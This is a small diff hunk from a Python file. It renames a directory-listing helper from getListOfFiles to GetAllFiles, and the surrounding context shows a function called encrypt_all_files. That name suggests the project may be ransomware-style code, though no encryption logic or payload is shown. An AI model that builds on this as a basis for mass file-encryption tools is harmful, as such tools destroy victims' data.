@@ -25,7 +25,7 @@ def encrypt_all_files():
                     pass
         break
 
-def getListOfFiles(dirName):
+def GetAllFiles(dirName):
     # create a list of file and sub directories 
     # names in the given directory 
     listOfFile = os.listdir(dirName)
